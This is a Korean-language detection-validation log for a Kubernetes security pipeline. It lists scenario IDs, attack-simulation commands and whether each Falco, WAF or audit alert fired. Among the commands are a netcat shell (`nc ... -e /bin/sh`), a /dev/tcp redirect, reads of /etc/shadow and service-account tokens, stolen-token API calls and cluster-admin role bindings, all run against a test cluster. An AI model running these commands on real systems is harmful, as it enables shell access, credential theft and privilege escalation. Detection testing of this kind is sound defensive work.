| curl (직접) | S84 | S60 명령과 동일(WAF sqli → WAS 500) 직후 pod 안에서 웹서버 자식 프로세스 이상 행위 필요 | ⏭️ 스킵 - S60과 같은 source_ip join 문제 + stage3(Falco 웹서버 이상 자식 프로세스)까지 재현하려면 3중 조건 충족 필요해 우선순위 낮춤 |
| (해당 없음) | S85 | 4단계(WAS 401/403→200→RBAC 변경→위험 pod 생성), stamps_fired_marker 브릿지 | ⏭️ 스킵 - 4단계 모두 정확히 순서/윈도우 맞춰 재현하기엔 우선순위 대비 복잡도가 높아 시간 관계상 보류 |
| (해당 없음) | S90 | 동일 WAF rule_id가 서로 다른 pod 3개 이상에서 짧은 시간 내 발생해야 함 | ⏭️ 스킵 - 현재 backend가 단일 replica(pod 1개)라 구조적으로 재현 불가, replica를 3개 이상으로 늘리지 않는 한 테스트 불가능 |
| kubectl (직접) | S2 | `kubectl get secrets -n default && kubectl create deployment temp-s2 --image=registry.k8s.io/pause:3.9 -n default && kubectl delete deployment temp-s2 -n default` | ✅ 완료(2026-07-22) severity 3 |
| kubectl (직접) | S6 | `kubectl create serviceaccount test-s6 -n kube-system && kubectl delete serviceaccount test-s6 -n kube-system` | ✅ 완료(2026-07-22) severity 4 - ART는 k8s_audit 이벤트를 못 만들어서 직접 kubectl 사용 |
| kubectl (직접) | S7 | `kubectl create serviceaccount test-s7 -n default && kubectl create rolebinding test-s7-binding --clusterrole=view --serviceaccount=default:test-s7 -n default` | ✅ 완료(2026-07-22) severity 4 |
| kubectl (직접) | S8 | `kubectl create namespace test-s8 && kubectl delete namespace test-s8 --wait=false` | ✅ 완료(2026-07-22) severity 4 |
| Atomic Red Team | S11 | `/srv/security-tools/art-venv/bin/python3 /srv/security-tools/run_atomic.py T1685 --index 0 --pod $(kubectl get pod -l app=backend -o jsonpath='{.items[0].metadata.name}') --container backend` | ⏭️ 스킵 - 실제 `system:*` RBAC 롤을 수정/삭제해야 발화되는데 공유 인프라(운영 클러스터 권한 체계)에 영구 손상 위험이 있어 의도적으로 미실행 |
| kubectl (직접) | S12 | `kubectl create role test-s12 --verb='*' --resource=pods -n default && kubectl delete role test-s12 -n default` | ✅ 완료(2026-07-22) severity 4 |
| kubectl (직접) | S13 | `kubectl create clusterrolebinding test-s13 --clusterrole=cluster-admin --serviceaccount=default:default && kubectl delete clusterrolebinding test-s13` | ✅ 완료(2026-07-22) severity 4 |
| stratus-red-team | S16 | `stratus detonate k8s.privilege-escalation.hostpath-volume` | ✅ 완료(2026-07-22) - 인시던트 `239e80f3-...` severity 4 |
| kubectl (직접) | S18 | `kubectl create configmap test-s18 --from-literal=password=hunter2 && kubectl delete configmap test-s18` | ✅ 완료(2026-07-22) severity 4 |
| curl (직접, WAS 로그용) | S19 | `for i in $(seq 6); do curl -s -X POST http://localhost:8000/proxy/rest/user/login -d '{"email":"x@x.com","password":"wrong"}' -H 'Content-Type: application/json'; done` (동일 IP 5회 이상 401/403) | ✅ 완료(2026-07-22) severity 3 |
| kubectl (직접) | S20 | `kubectl create -f daemonset.yaml` (pause 이미지 최소 DaemonSet, 섹션 9 하단 예시 참고) `&& kubectl delete daemonset test-s20` | ✅ 완료(2026-07-22) severity 4 |
| kubectl (직접) | S21 | `kubectl create cronjob test-s21 --image=busybox --schedule="*/5 * * * *" -- echo hi && kubectl delete cronjob test-s21` | ✅ 완료(2026-07-22) severity 3 |
| 더미 명령(도구 무관) | S22 | `kubectl exec backend-POD -c backend -- echo stratum+tcp://test.example` (섹션 7 참고, 실제 채굴 없이 문자열 매칭만) | ✅ 완료(2026-07-22) severity 4 |
| falco-event-generator | S23 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.ClearLogActivities` | ✅ 완료(2026-07-22) severity 3 |
| OWASP ZAP | S26 | S19과 같은 로그인 실패 다발 요청이 WAF 계층에서도 brute_force로 별도 매치됨(위 S19 명령 참고) | ✅ 완료(2026-07-22) severity 3 |
| curl (직접) | S28 | `curl -s http://localhost:8000/proxy/ -A "sqlmap/1.0"` (backend `BAD_BOT_USER_AGENTS` 목록에 매치되는 UA) | ✅ 완료(2026-07-22) severity 2 |
| curl (직접) | S30 | `for i in $(seq 12); do curl -s http://localhost:8000/proxy/api/Products/999999999; done` (동일 IP 10회 이상 404) | ✅ 완료(2026-07-22) severity 2 |
| kubectl (직접) | S31 | `kubectl get roles,clusterroles,rolebindings,clusterrolebindings -A` (5개 이상 list 호출) | ✅ 완료(2026-07-22) severity 2 |
| kubectl exec (직접) | S32 | `kubectl exec backend-POD -c backend -- timeout 2 bash -c 'exec 0<>/dev/tcp/127.0.0.1/8000 1>&0 2>&0; echo hi >&0'` | ✅ 완료(2026-07-22) severity 4 |
| falco-event-generator | S35 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.NetcatRemoteCodeExecutionInContainer` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S37 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.RemoveBulkDataFromDisk` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S38 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.FindAwsCredentials` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S39 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.SearchPrivateKeysOrPasswords` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S40 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.PtraceAttachedToProcess` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S41 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.ExecutionFromDevShm` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S42 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.DisallowedSSHConnectionNonStandardPort` | ✅ 완료(2026-07-22) severity 2 |
| falco-event-generator | S43 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.SystemUserInteractive` | ❌ 2026-07-22 시도했으나 미발화 - pod에 tty/세션 조건 미충족 추정, 재확인 필요 |
| falco-event-generator | S45 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.ReadSensitiveFileUntrusted` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S46 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.CreateHardlinkOverSensitiveFiles` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S47 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.CreateSymlinkOverSensitiveFiles` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S48 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.ReadSensitiveFileTrustedAfterStartup` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S49 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.DirectoryTraversalMonitoredFileRead` | ✅ 완료(2026-07-22) severity 3 |
| OWASP ZAP | S51 | ZAP baseline 스캔이 요청마다 다른 UA를 자동 회전(부수효과), 별도 명령 불필요 | ✅ 완료(2026-07-22) severity 2 |
| falco-event-generator | S52 | 기본 event-generator pod는 non-privileged라 실패 → 커스텀 privileged pod YAML(`securityContext.privileged: true`)로 재생성 후 동일 액션 실행 | ✅ 완료(2026-07-22) severity 4 - privileged 모드 재시도로 해결 |
| Atomic Red Team | S53 | `/srv/security-tools/art-venv/bin/python3 /srv/security-tools/run_atomic.py T1136.001 --index 0 --pod $(kubectl get pod -l app=backend -o jsonpath='{.items[0].metadata.name}') --container backend` | ✅ 완료(2026-07-22) - 인시던트 `2fcf7699-...` severity 4 |
| curl (직접) | S54 | `curl -s http://localhost:8000/proxy/ -H 'User-Agent:'` (User-Agent 헤더 자체를 제거) | ✅ 완료(2026-07-22) severity 2 |
| kubectl exec (직접) | S56 | `kubectl exec backend-POD -c backend -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null` | ✅ 완료(2026-07-22) severity 4 |
| kubectl (직접) | S62 | S31 실행 직후(같은 세션에서) `kubectl get secrets -n default` | ✅ 완료(2026-07-22) severity 4 - S31이 최근 발화해 있어야 함(requires_recent_fire) |
| falco-event-generator + kubectl | S64 | `kubectl run test-s64 --image=falcosecurity/event-generator:latest --restart=Never -- run syscall.ClearLogActivities && sleep 5 && kubectl delete pod test-s64 && kubectl run test-s64 --image=busybox --restart=Never -- sleep 30` (동일 pod 이름 재사용 필수) | ✅ 완료(2026-07-22) severity 4 |
| falco-event-generator + kubectl exec | S66 | 지속 pod에서 `kubectl exec POD -- useradd testuser1` 실행 후 `kubectl exec POD -- event-generator run syscall.DisallowedSSHConnectionNonStandardPort` (동일 pod, 순서대로 분리 실행) | ✅ 완료(2026-07-22) severity 4 |
| stratus-red-team | S69 | `stratus detonate k8s.privilege-escalation.hostpath-volume` 직후 같은 pod에서 S43(SystemUserInteractive) 발화 필요 | ⏭️ 스킵 - S43(stage1) 자체가 미발화 상태라 stage2 연계 불가, S43 원인 규명 후 재시도 필요 |
| falco 커스텀 룰 + kubectl | S70 | `kubectl exec juice-shop-POD -c nginx-was-logger -- whoami`(또는 `-t` 옵션) 직후 훔친 토큰으로 `get secrets` API 호출 | ❌ 2026-07-22 재검증 - S5/S59/S87 교훈을 반영해 juice-shop pod + 훔친 토큰 방식으로 재시도했지만, 애초에 stage1("Basic Interactive Reconnaissance" 커스텀 룰) 자체가 수동 kubectl exec(-t, script -qc 등 여러 방식 시도)로는 전혀 재발화하지 않음 - 최초 검증 때 관측된 발화는 사실 수동 트리거가 아니라 5분 간격으로 반복되는 backend pod 내부의 원인불명 주기적 프로세스였던 것으로 추정(raw falco 로그에서 동일 조건의 whoami가 사람 개입 없이 주기적으로 찍힘). 커스텀 룰의 실제 매치 조건(is_vpgid_leader 등) 재점검 필요 |
| kubectl (직접) | S72 | `kubectl create deployment test-s72 --image=registry.k8s.io/pause:3.9 && sleep 2 && kubectl delete deployment test-s72` | ✅ 완료(2026-07-22) severity 4 |
| kubectl (직접) | S73 | DaemonSet 생성/삭제 후 같은 신원으로 privileged pod 생성 (섹션 9 하단 예시 daemonset.yaml 참고) | ✅ 완료(2026-07-22) severity 4 |
| falco-event-generator + kubectl | S74 | `kubectl run seq-s74 --image=falcosecurity/event-generator:latest --restart=Never -- run syscall.DisallowedSSHConnectionNonStandardPort && sleep 6 && kubectl delete pod seq-s74 && kubectl run seq-s74 --image=falcosecurity/event-generator:latest --restart=Never -- run syscall.NetcatRemoteCodeExecutionInContainer` (동일 pod 이름 재사용 필수 - 하나의 run 호출에 두 액션을 같이 넣으면 실행 순서가 뒤바뀌어 시퀀스가 안 잡힘, 반드시 분리) | ✅ 완료(2026-07-22) severity 4 |
| stratus-red-team | S75 | `stratus detonate k8s.privilege-escalation.hostpath-volume` (stage1) 직후 같은 pod에서 release_agent 기반 컨테이너 탈출(stage2) 필요 | ⏭️ 스킵 - stage1(stratus)만 확인, stage2(실제 컨테이너 이스케이프)는 공유 인프라에서 안전하게 재현하기 위험하다고 판단해 의도적으로 미실행 |
| falco-event-generator (privileged pod) | S76 | privileged pod에서 `event-generator run 'syscall.DetectReleaseAgentFileContainerEscapes\|syscall.RemoveBulkDataFromDisk'` | ❌ 2026-07-22 시도 - stage2(RemoveBulkDataFromDisk)는 발화했지만 stage1(release_agent escape)은 event-generator 이미지에 `capsh` 유틸리티가 없어서 스킵됨(도구 자체 한계), 시퀀스 미완성 |
| kubectl (직접) | S77 | `timeout 2 kubectl port-forward svc/backend 18000:8000` | ✅ 완료(2026-07-22) severity 3 |
| kubectl (직접) | S79 | `for i in $(seq 10); do kubectl get serviceaccounts -n default >/dev/null; done` | ✅ 완료(2026-07-22) severity 2 |
| falco-event-generator + kubectl | S80 | `kubectl run seq-s80 --image=falcosecurity/event-generator:latest --restart=Never -- run syscall.PtraceAttachedToProcess && sleep 6 && kubectl delete pod seq-s80 && kubectl run seq-s80 --image=falcosecurity/event-generator:latest --restart=Never -- run syscall.DropAndExecuteNewBinaryInContainer` (동일 pod 이름 재사용, S74와 같은 이유로 분리 실행 필수) | ✅ 완료(2026-07-22) severity 4 |
| (해당 없음) | S81 | 4단계(WAF→쉘 획득→Debugfs→커널모듈 삽입) 연쇄, 모두 동일 pod로 join 필요 | ⏭️ 스킵 - S5에서 확인된 WAF→쉘 연계 문제 + 실제 커널 모듈 삽입은 안전상 재현 부적절로 판단, 단계별 개별 발화(Debugfs는 S52에서 이미 확인)만 부분 검증 |
| (해당 없음) | S82 | 3단계(파일 업로드 200→크립토마이닝 Falco→CronJob 생성), 동일 user_or_sa로 join 필요 | ⏭️ 스킵 - S83에서 확인된 것과 같은 원인(WAS 이벤트의 user_or_sa 미충족 추정)으로 stage1이 join 안 될 가능성이 높아 우선순위상 보류, 크립토마이닝(S22)/CronJob(S109)/토큰 탈취 체인(S59)은 각각 개별 확인됨 |
| curl + kubectl exec | S83 | juice-shop에 테스트 유저 회원가입 후 틀린 비번으로 로그인 실패 → 올바른 비번으로 실제 로그인 성공(200) → 훔친 토큰으로 `POST .../secrets` 호출 | ❌ 2026-07-22 재검증 - S59/S87과 같은 방식(juice-shop pod + 훔친 토큰)으로 재시도, 실제 회원가입/로그인 성공까지 다 만들었지만 stage1/2(WAF brute_force, WAS 로그인 200)의 actor_identity가 join에 안 잡힘 - WAF/WAS 이벤트는 Falco와 달리 user_or_sa가 실제로 채워지지 않는 것으로 추정(enrichment.py 폴백은 응답 자체가 없는 경우에만 동작, 정상 응답이 있는 이 케이스는 다른 경로를 타는데 그 경로가 비어있는 듯) - 코드 확인 필요 |
| kubectl (직접) | S86 | `kubectl apply -f mutatingwebhook.yaml` (더미 MutatingWebhookConfiguration, 섹션 9 하단 예시) `&& kubectl delete mutatingwebhookconfiguration test-s86` | ✅ 완료(2026-07-22) severity 4 |
| curl(훔친 토큰) + kubectl exec | S87 | juice-shop pod에서 훔친 SA 토큰으로 `POST .../apis/batch/v1/namespaces/default/cronjobs` 호출 직후 같은 pod에서 `nc 127.0.0.1 4444 -e /bin/sh` (busybox nc의 `-e`는 반드시 마지막 옵션) | ✅ 완료(2026-07-22) severity 4 - 최초엔 내 kubectl(system:admin)로 cronjob을 만들고 별도 backend pod에서 event-generator를 돌려 실패했음(신원·pod 둘 다 안 맞음) - juice-shop pod + 훔친 토큰으로 재시도 후 발화 확인 |
| kubectl (직접) | S89 | `kubectl logs backend-POD -c backend --tail=1` | ✅ 완료(2026-07-22) severity 3, 여러 번 발화 확인 |
| OWASP ZAP | S92 | ZAP baseline 스캔(섹션 4)이 15개 이상 distinct path를 자동으로 만들어냄, 별도 명령 불필요 | ✅ 완료(2026-07-22) severity 2 - ZAP 스캔의 부수효과로 자동 발화 |
| OWASP ZAP + falco-event-generator | S93 | S92(ZAP) 발화 직후 `kubectl exec <juice-shop-pod> -c nginx-was-logger -- sh -c 'cat /etc/shadow > /dev/null'` (juice-shop 본체는 셸 없음, 사이드카 컨테이너 이용) | ✅ 완료(2026-07-22) severity 4 - 반드시 같은 juice-shop pod에서, S92 발화 후 300초 안에 실행해야 함 |
| (해당 없음) | S95 | 동일 신원(user_or_sa)이 서로 다른 5개 이상의 source_ip에서 k8s_audit 액션을 수행해야 발화 | ⏭️ 스킵 - 테스트 환경에서 단일 클라이언트 IP만 통제 가능해 재현 불가(다른 소스 IP를 여러 개 만들어야 함) |
| kubectl (직접) | S96 | `for i in 1 2 3 4 5; do kubectl create rolebinding test-s96-$i --clusterrole=view --user=test-subject-$i -n default; done` (5개 이상 distinct subject) | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S99 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run 'ReadSensitiveFileUntrusted\|CreateHardlinkOverSensitiveFiles\|CreateSymlinkOverSensitiveFiles'` (같은 pod에서 3개 이상 distinct 필요) | ✅ 완료(2026-07-22) severity 4 - S45~S49 배치 실행의 부수효과로 자동 발화 |
| falco-event-generator | S100 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run 'PtraceAttachedToProcess\|PtraceAntiDebugAttempt'` (반드시 같은 pod, 즉 한 번의 run 호출 안에서) | ✅ 완료(2026-07-22) severity 4 |
| curl (직접) | S101 | `curl -s -o /dev/null http://localhost:8000/proxy/api/Products/999999999 && curl -s -o /dev/null http://localhost:8000/proxy/` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S102 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run 'NetcatRemoteCodeExecutionInContainer\|DropAndExecuteNewBinaryInContainer'` (반드시 같은 pod) | ✅ 완료(2026-07-22) severity 4 |
| kubectl (직접) | S106 | S96에서 만든 rolebinding 5개를 `kubectl delete rolebinding test-s96-1 test-s96-2 test-s96-3 test-s96-4 test-s96-5 -n default` (3개 이상 distinct 이름) | ✅ 완료(2026-07-22) severity 3 |
| kubectl (직접) | S109 | `for ns in default dummy-attacks falco; do kubectl create cronjob test-s109 --image=busybox --schedule='*/5 * * * *' -n $ns -- /bin/sh -c 'echo hi'; done` (서로 다른 namespace 3개 이상) | ✅ 완료(2026-07-22) severity 3 |

### 9-1. 신규 발견 - 아직 미실행 (2026-07-23, 직접 테스트용)

섹션 6/8 재검토로 새로 찾은, "인정된 도구"로 검증 가능한 3개 시나리오. 위 77개와 달리
**아직 실행 안 함** - 실행 결과 칸을 직접 채워 넣을 것. 확인 절차는 섹션 8 상단(8-0
아래) "직접 재현/나머지 검증할 때 쓸 공통 절차" 그대로.

⚠️ stratus 실행 후에는 매번 `stratus cleanup <기법ID>`로 뒷정리할 것(안 하면 테스트용
ServiceAccount/ClusterRole/CSR이 클러스터에 남음).

| 도구 | 시나리오 | 실행 명령 | 실행 결과 |
|---|---|---|---|
| stratus-red-team | S25 | `stratus detonate k8s.persistence.create-token && stratus cleanup k8s.persistence.create-token` | ✅ 완료(2026-07-22) - "ServiceAccount 토큰 명시적 발급 정황" 발화, join_key=system:admin |
| stratus-red-team | S57 | `stratus detonate k8s.persistence.create-client-certificate && stratus cleanup k8s.persistence.create-client-certificate` (참고: EKS는 CSR이 승인돼도 인증서 발급 자체가 안 되는 알려진 이슈가 있음 - 우리 k3d 환경은 CSR이 실제로 승인되어 `system:kube-controller-manager` 신원의 인증서까지 발급됨) | ✅ 완료(2026-07-22) - "CSR 기반 클라이언트 인증서 발급 정황" 발화, join_key=system:admin |
| stratus-red-team | S58 | `stratus detonate k8s.privilege-escalation.nodes-proxy && stratus cleanup k8s.privilege-escalation.nodes-proxy` | ✅ 완료(2026-07-22) - "nodes/proxy 권한상승 악용 정황" 발화, join_key=system:serviceaccount:stratus-red-team-np-name-ctqqgjar:stratus-red-team-np-sa (stratus가 만든 전용 SA 신원으로 정확히 join됨) |

추가로, 섹션 8-5에서 언급한 falco-event-generator 액션 4개(S34/S36/S44/S50)와 그 조합
cardinality 시나리오(S103)도 "인정된 도구"로 즉시 실행 가능함(둘 다 순서 무관한
threshold/cardinality라 섹션 1의 순서 경고 대상 아님):

| 도구 | 시나리오 | 실행 명령 | 실행 결과 |
|---|---|---|---|
| falco-event-generator | S34 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.DropAndExecuteNewBinaryInContainer` | ✅ 완료(2026-07-22) severity 4 |
| falco-event-generator | S36 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.FilelessExecutionViaMemfdCreate` | ✅ 완료(2026-07-22) severity 4 |
| falco-event-generator | S44 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.PtraceAntiDebugAttempt` | ✅ 완료(2026-07-22) severity 2 |
| falco-event-generator | S50 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run syscall.PacketSocketCreatedInContainer` | ✅ 완료(2026-07-22) severity 3 |
| falco-event-generator | S103 | `kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run 'FilelessExecutionViaMemfdCreate\|ExecutionFromDevShm'` (같은 pod, cardinality라 순서 무관 - 2개 distinct action이면 충분) | ✅ 완료(2026-07-22) severity 4 - memfd_create/dev_shm 개별 threshold(S36/S41)와 cardinality(S103) 셋 다 동시에 발화 확인 |

**8개 전부 확인 완료(2026-07-22) - 109개 중 85개(78%)가 인정된 외부 도구로 검증됨**
(섹션 8 총계 80개 + 이번에 새로 확인된 event-generator 5개 S34/S36/S44/S50/S103;
S25/S57/S58은 stratus로 이미 80개 안에 포함돼 있었음).
(부수적으로 이번 실행 중 "정찰 리소스 타입의 다양성 탐지"(S105)와 "RBAC 권한상승 이후
pod exec"(S3)도 곁다리로 발화하는 게 관측됐으나, 특정 도구를 목표로 실행한 게 아니라
누적된 kubectl 사용 자체의 부수효과라 "도구로 검증됨" 목록에는 포함하지 않음 - 29개
미커버 목록은 그대로 유지.)
